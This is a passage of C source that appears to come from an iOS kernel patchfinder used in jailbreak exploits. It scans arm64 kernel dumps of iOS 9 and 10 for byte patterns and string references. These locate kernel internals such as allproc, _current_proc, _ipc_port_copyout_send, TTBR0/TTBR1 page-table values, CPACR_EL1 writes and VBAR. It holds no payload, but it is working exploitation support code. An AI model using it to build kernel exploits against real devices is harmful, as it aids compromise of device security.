    // 1. find {{ MRS X8, TPIDR_EL1 // LDR X8, [X8,#0x310] // LDR X1, [X8,#0x2A0] // MOV X0, X23 }}
    // or
    // 1. find {{ MRS X8, TPIDR_EL1 // LDR X8, [X8,#0x6B0] // LDR X1, [X8,#0x288] // MOV X0, X23 }}
    // 2. find next BL
    // 3. decode BL address - it's _ipc_port_copyout_send
    
    // or
    // 1. find {{ MRS X8, TPIDR_EL1 // LDR X8, [X8,#0x318] // LDR X1, [X8,#0x2A0] // BL _ipc_port_copyout_send }}
    uint8_t magic_code2[] = { 0x88, 0xD0, 0x38, 0xD5, 0x08, 0x00, 0x00, 0xF9, 0x01, 0x00, 0x41, 0xF9, 0x00, 0x00, 0x00, 0x94 };
    uint8_t magic_mask2[] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0xFF, 0xFF, 0x00, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0xFC };
    
    // locate sequence
    //uint32_t* magicSequencePtr = (uint32_t *)memmem(kdata, ksize, mask_special, sizeof(mask_special) / sizeof(*mask_special));
    uint32_t *magicSequencePtr = find_masked(kdata, ksize, magic_code, magic_mask, sizeof(magic_code) / sizeof(*magic_code));
    if (!magicSequencePtr) {
        magicSequencePtr = find_masked(kdata, ksize, magic_code2, magic_mask2, sizeof(magic_code2) / sizeof(*magic_code2));
        if (!magicSequencePtr)
            return 0;
    }
    
    //PFLog("magicSequencePtr %p\n", (void *)((uint8_t*)magicSequencePtr - kdata));
    
    uint32_t *bl_ipc_port_copyout_send = find_next_insn_matching_64(region, kdata, ksize, magicSequencePtr, insn_is_bl_64);
    if (!bl_ipc_port_copyout_send)
        return 0;
    
    //PFLog("bl_ipc_port_copyout_send %p\n", (void *)((uint8_t*)bl_ipc_port_copyout_send - kdata));
    
    uint8_t* address = (uint8_t *)bl_ipc_port_copyout_send + insn_bl_imm32_64(bl_ipc_port_copyout_send);
    if (!address)
        return 0;
    
    //PFLog("address _ipc_port_copyout_send %p\n", (void *)(address - kdata));
    
    return (uint64_t)(address - kdata);
}

uint64_t find_current_proc(uint64_t region, uint8_t* kdata, size_t ksize)
{
    // 1. find with memmem
    // 2. find string reference
    // 3. find begin of function - it's _current_proc
    
    const char magicString[] = "\"returning child proc which is not cur_act";
    uint8_t* string = memmem(kdata, ksize, magicString, sizeof(magicString) - 1);
    if(!string)
        return 0;
    uint32_t* ref = find_literal_ref_64(region, kdata, ksize, (uint32_t*)kdata, (uintptr_t)string - (uintptr_t)kdata);
    if(!ref)
        return 0;
    
    uint8_t *_current_proc_func = (uint8_t *)find_last_insn_matching_64(region, kdata, ksize, ref, insn_is_funcbegin_64);
    if (!_current_proc_func)
        return 0;
    
    return (uint64_t)(_current_proc_func - kdata);
}

uint64_t find_all_proc(uint64_t region, uint8_t* kdata, size_t ksize)
{
    // __text:FFFFFF800BB75E58 23 0A 00 90                 ADRP            X3, #aShutdownwait@PAGE ; "shutdownwait"
    // __text:FFFFFF800BB75E5C 63 48 04 91                 ADD             X3, X3, #aShutdownwait@PAGEOFF ; "shutdownwait"
    // __text:FFFFFF800BB75E60 DF BF FF 97                 BL              _msleep
    // __text:FFFFFF800BB75E64 FB 03 00 AA                 MOV             X27, X0
    // __text:FFFFFF800BB75E68 9B 05 00 34                 CBZ             W27, loc_FFFFFF800BB75F18
    // __text:FFFFFF800BB75E6C 48 AF 40 F9                 LDR             X8, [X26,#(all_proc - 0xFFFFFF800BD9E050)]
    //
    // __text:FFFFFF800245FD5C 83 0E 00 90                 ADRP            X3, #aShutdownwait@PAGE ; "shutdownwait"
    // __text:FFFFFF800245FD60 63 38 31 91                 ADD             X3, X3, #aShutdownwait@PAGEOFF ; "shutdownwait"
    // __text:FFFFFF800245FD64 E4 17 40 F9                 LDR             X4, [SP,#0xE0+var_B8]
    // __text:FFFFFF800245FD68 31 16 00 94                 BL              _msleep
    // __text:FFFFFF800245FD6C FB 03 00 AA                 MOV             X27, X0
    // __text:FFFFFF800245FD70 FB 06 00 34                 CBZ             W27, loc_FFFFFF800245FE4C
    // __text:FFFFFF800245FD74 C8 13 00 90                 ADRP            X8, #_allproc@PAGE
    // __text:FFFFFF800245FD78 08 0D 44 F9                 LDR             X8, [X8,#_allproc@PAGEOFF]
    uint8_t* str = memmem(kdata, ksize, "shutdownwait", sizeof("shutdownwait"));
    if(!str)
        return 0;
    
    // Find a reference to the string.
    uint32_t* ref = find_literal_ref_64(region, kdata, ksize, (uint32_t*)kdata, (uintptr_t)str - (uintptr_t)kdata);
    if (!ref)
        return 0;
    
    //PFLog("string ref %p\n", (void *)((uint8_t *)ref - kdata));
    
    // find BL
    uint32_t *bl_addr = find_next_insn_matching_64(region, kdata, ksize, ref, insn_is_bl_64);
    if (!bl_addr)
        return 0;
    
    //PFLog("bl_addr %p\n", (void *)((uint8_t *)bl_addr - kdata));
    
    // Find LDR
    uint32_t* ldr_addr = find_next_insn_matching_64(region, kdata, ksize, bl_addr, insn_is_ldr_imm_64);
    if (!ldr_addr)
        return 0;
    
    //PFLog("ldr_addr %p\n", (void *)((uint8_t *)ldr_addr - kdata));
    
    uint64_t pc_ref = find_pc_rel_value_64(region, kdata, ksize, ldr_addr, insn_ldr_imm_rn_64(ldr_addr));
    if (!pc_ref)
        return 0;
    
    return find_pc_rel_value_64(region, kdata, ksize, ldr_addr + 1, insn_ldr_imm_rn_64(ldr_addr));
}

static int insn_is_mrs_x1_esr_el1(uint32_t *insn)
{
    return (*insn == 0xD5385201);
}

uint64_t find_data_abort(uint64_t region, uint8_t* kdata, size_t ksize)
{
    // 1. find with memmem
    // 2. find string reference
    // 3. find begin of function - MRS X1, #0, c5, c2, #0 instruction (MRS X1, ESR_EL1)
    // 4. find reference to function
    // 5. find begin of function (until first NOP) - it's _data_abort
    
    const char magicString[] = "Synchronous exception taken while SP1 selected";
    uint8_t* string = memmem(kdata, ksize, magicString, sizeof(magicString) - 1);
    if(!string)
        return 0;
    uint32_t* ref = find_literal_ref_64(region, kdata, ksize, (uint32_t*)kdata, (uintptr_t)string - (uintptr_t)kdata);
    if(!ref)
        return 0;
    
    uint8_t *insn_mrs_x1_esr1_el1 = (uint8_t *)find_last_insn_matching_64(region, kdata, ksize, ref, insn_is_mrs_x1_esr_el1);
    if (!insn_mrs_x1_esr1_el1)
        return 0;
    
    // now we have to find code in the kernel referencing to this error string
    uint32_t *adr_instr = find_literal_ref_64(region, kdata, ksize, (uint32_t*)kdata, insn_mrs_x1_esr1_el1 - kdata);
    if (!adr_instr)
        return 0;
    
    uint8_t *_data_abort = (uint8_t *)find_last_insn_matching_64(region, kdata, ksize, adr_instr, insn_nop_64);
    if (!_data_abort)
        return 0;
    
    return (uint64_t)(_data_abort + 4 - kdata);
}

// CPACR
uint64_t find_cpacr_el1(uint64_t region, uint8_t* kdata, size_t ksize)
{
    // find "MSR CPACR_EL1, X0" instruction
    uint8_t CPACR_EL1[] = { 0x40, 0x10, 0x18, 0xD5 };
    uint8_t* insn = memmem(kdata, ksize, CPACR_EL1, sizeof(CPACR_EL1) / sizeof(*CPACR_EL1));
    if (!insn)
        return 0;
    
    return (uint64_t)(insn - kdata);
}

uint32_t *find_msr_ttbr0_el1_msr_ttbr1_el1(uint64_t region, uint8_t* kdata, size_t ksize)
{
    // find "MSR TTBR0_EL1, X0" and "MSR TTBR1_EL1, X1" instruction
    uint8_t MSR_TTBR0_EL1_MSR_TTBR0_EL1[] = { 0x00, 0x20, 0x18, 0xD5, 0x21, 0x20, 0x18, 0xD5 };
    uint32_t* insn = memmem(kdata, ksize, MSR_TTBR0_EL1_MSR_TTBR0_EL1, sizeof(MSR_TTBR0_EL1_MSR_TTBR0_EL1) / sizeof(*MSR_TTBR0_EL1_MSR_TTBR0_EL1));
    if (!insn)
        return 0;
    
    return insn;
}

// TTBRMAGIC_BX0
uint64_t find_arm_init_tramp(uint64_t region, uint8_t* kdata, size_t ksize)
{
    uint32_t *insn_init_tramp = find_msr_ttbr0_el1_msr_ttbr1_el1(region, kdata, ksize);
    if (!insn_init_tramp)
        return 0;
    
    uint32_t *insn = 0;
    if (!insn_is_ldr_imm_64(insn_init_tramp - 1)) {
        // try iOS 9.x
        
        // x0 = x25 + 0x4000
        // x1 = x25 + 0x5000
        // 6 9.3.4, 5s 9.3.5
        uint8_t loadData[] = { 0x20, 0x13, 0x40, 0x91, 0x01, 0x04, 0x40, 0x91 };
        // x0 = x25 + 0x10000
        // x1 = x25 + 0x14000
        // 6s 9.3.5
        uint8_t loadData2[] = { 0x20, 0x43, 0x40, 0x91, 0x01, 0x10, 0x40, 0x91 };
        
        insn = insn_init_tramp  - 2;
        
        // check first instructions
        if (memcmp(insn, loadData, sizeof(loadData) / sizeof(*loadData)))
            if (memcmp(insn, loadData2, sizeof(loadData2) / sizeof(*loadData2)))
                return 0;
    } else {
        // iOS 10.x
        
        // find adrp x1, TTBR1_EL1
        insn = find_next_insn_matching_64(region, kdata, ksize, insn_init_tramp - 6, insn_is_adrp_64);
    
        // find adrp x0, TTBR0_EL1
        insn = find_last_insn_matching_64(region, kdata, ksize, insn, insn_is_adrp_64);
        if (!insn)
            return 0;
    }
    
    return (uint64_t)((uint8_t *)insn - kdata);
}

uint32_t *find_set_mmu_ttb_alternate(uint64_t region, uint8_t* kdata, size_t ksize)
{
    uint8_t magic_dsb_sy_msr_ttbr1_el1[] = { 0x9F, 0x3F, 0x03, 0xD5, 0x20, 0x20, 0x18, 0xD5 };
    
    // find _set_mmu_ttb_alternate
    return memmem(kdata, ksize, magic_dsb_sy_msr_ttbr1_el1, sizeof(magic_dsb_sy_msr_ttbr1_el1) / sizeof(*magic_dsb_sy_msr_ttbr1_el1));
}

uint64_t find_ttbr0_el1_2(uint64_t region, uint8_t* kdata, size_t ksize)
{
    // find "top byte ignored" string (boot kernel configuration setting name)
    const char tbi_str[] = "tbi";
    uint8_t *tbiStringPtr = memmem(kdata, ksize, tbi_str, sizeof(tbi_str) / sizeof(*tbi_str));
    if (!tbiStringPtr)
        return 0;
    
    PFLog("%s: tbiStringPtr %p\n", __PRETTY_FUNCTION__, (void *)(tbiStringPtr - kdata + region));
    
    // now we have to find code in the kernel referencing to this error string
    uint32_t *adr_instr = find_literal_ref_64(region, kdata, ksize, (uint32_t*)kdata, tbiStringPtr - kdata);
    if (!adr_instr)
        return 0;
    
    // it's _arm_vm_init function, previous call is "bl _set_mmu_ttb_alternate"
    uint32_t *bl_instr = find_last_insn_matching_64(region, kdata, ksize, adr_instr, insn_is_bl_64);
    if (!bl_instr)
        return 0;
    
    // find _set_mmu_tlb_alternative itself
    uint32_t *_set_mmu_tlb_alternative = find_set_mmu_ttb_alternate(region, kdata, ksize);
    if (!_set_mmu_tlb_alternative)
        return 0;
    PFLog("_set_mmu_tlb_alternative value %p\n", _set_mmu_tlb_alternative);
    
    // check that BL is our "bl _set_mmu_tlb_alternative"
    uint64_t value = insn_bl_imm32_64(bl_instr);
    PFLog("value of BL offset %p\n", (void *)value);
    
    if (value + (uint64_t)bl_instr != (uint64_t)_set_mmu_tlb_alternative) // 0x1212C4CB8
        return 0;
    
    uint8_t ttbr0_el1_x8[] = { 0x08, 0x20, 0x18, 0xD5 };
    uint32_t *insn = (uint32_t *)memmem_back_64(bl_instr, 10 * 4, ttbr0_el1_x8, 4);
    if (!insn)
        return 0;
    
    return find_pc_rel_value_64(region, kdata, ksize, insn - 1, 8);
}

uint64_t find_ttbr1_el1_2(uint64_t region, uint8_t* kdata, size_t ksize)
{
    // find "top byte ignored" string (boot kernel configuration setting name)
    const char tbi_str[] = "tbi";
    uint8_t *tbiStringPtr = memmem(kdata, ksize, tbi_str, sizeof(tbi_str) / sizeof(*tbi_str));
    if (!tbiStringPtr)
        return 0;
    
    PFLog("%s: tbiStringPtr %p\n", __PRETTY_FUNCTION__, (void *)(tbiStringPtr - kdata + region));
    
    // now we have to find code in the kernel referencing to this error string
    uint32_t *adr_instr = find_literal_ref_64(region, kdata, ksize, (uint32_t*)kdata, tbiStringPtr - kdata);
    if (!adr_instr)
        return 0;
    
    // it's _arm_vm_init function, previous call is "bl _set_mmu_ttb_alternate"
    uint32_t *bl_instr = find_last_insn_matching_64(region, kdata, ksize, adr_instr, insn_is_bl_64);
    if (!bl_instr)
        return 0;
    
    // find _set_mmu_tlb_alternative itself
    uint32_t *_set_mmu_tlb_alternative = find_set_mmu_ttb_alternate(region, kdata, ksize);
    if (!_set_mmu_tlb_alternative)
        return 0;
    PFLog("_set_mmu_tlb_alternative value %p\n", _set_mmu_tlb_alternative);
    
    // check that BL is our "bl _set_mmu_tlb_alternative"
    uint64_t value = insn_bl_imm32_64(bl_instr);
    PFLog("value of BL offset %p\n", (void *)value);
    
    if (value + (uint64_t)bl_instr != (uint64_t)_set_mmu_tlb_alternative) // 0x1212C4CB8
        return 0;
    
    return find_pc_rel_value_64(region, kdata, ksize, bl_instr - 1, 8);
}

// TTBR0, on dumps only!
uint64_t find_ttbr0_el1(uint64_t region, uint8_t* kdata, size_t ksize)
{
    uint64_t _arm_init_tramp_offset = find_arm_init_tramp(region, kdata, ksize);
    if (!_arm_init_tramp_offset)
        return 0;
    
    uint32_t *_arm_init_tramp = (uint32_t *)(kdata + _arm_init_tramp_offset);
    
    //PFLog("_arm_init_tramp offset %#llx\n", _arm_init_tramp_offset);
    
    // find adrp x1, TTBR1_EL1
    uint32_t *insn = find_next_insn_matching_64(region, kdata, ksize, _arm_init_tramp, insn_is_adrp_64);
    //PFLog("insn %p\n", (void *)(insn - _arm_init_tramp));
    if (!insn || (insn - _arm_init_tramp > 6)) {
        // try iOS 9.x
        // read from PMAP
        uint64_t pmap = find_pmap_location(region, kdata, ksize);
        if (!pmap)
            return 0;
        
        // read offset of pmap_store
        uint64_t kernel_pmap = *(uint64_t *)(kdata + pmap);
        if (!kernel_pmap)
            return 0;
        
        return kernel_pmap - region + 8;
    }
    else {
        // iOS 10.x
        //PFLog("iOS 10.x case\n");
        
        // get X0
        return find_pc_rel_value_64(region, kdata, ksize, _arm_init_tramp + 6, 0);
    }
}

// TTBR1, on dumps only!
uint64_t find_ttbr1_el1(uint64_t region, uint8_t* kdata, size_t ksize)
{
    uint64_t _arm_init_tramp_offset = find_arm_init_tramp(region, kdata, ksize);
    if (!_arm_init_tramp_offset)
        return 0;
    
    uint32_t *_arm_init_tramp = (uint32_t *)(kdata + _arm_init_tramp_offset);
    
    // find adrp x1, TTBR1_EL1
    uint32_t *insn = find_next_insn_matching_64(region, kdata, ksize, _arm_init_tramp, insn_is_adrp_64);
    if (!insn || (insn - _arm_init_tramp > 6)) {
        // try iOS 9.x
        
        // read from PMAP
        uint64_t pmap = find_pmap_location(region, kdata, ksize);
        if (!pmap)
            return 0;
        
        // read offset of pmap_store
        uint64_t kernel_pmap = *(uint64_t *)(kdata + pmap);
        if (!kernel_pmap)
            return 0;
        
        return kernel_pmap - region + 8;
    }
    else {
        // iOS 10.x
        //PFLog("iOS 10.x case\n");
        
        // get X1
        return find_pc_rel_value_64(region, kdata, ksize, _arm_init_tramp + 6, 1);
    }
}

// VBAR
uint64_t find_vbar(uint64_t region, uint8_t* kdata, size_t ksize)
{
    // find "MRS X0, SP_EL0" instruction
    uint8_t MRS_X0_SP_EL0[] = { 0x00, 0x41, 0x38, 0xD5 };
    uint32_t* insn = memmem(kdata, ksize, MRS_X0_SP_EL0, sizeof(MRS_X0_SP_EL0) / sizeof(*MRS_X0_SP_EL0));
    if (!insn)
        return 0;
    
    // align 0x1000
    uint64_t address = ((uint8_t *)insn - kdata) & ~0xFFF;
    
    return address;
}
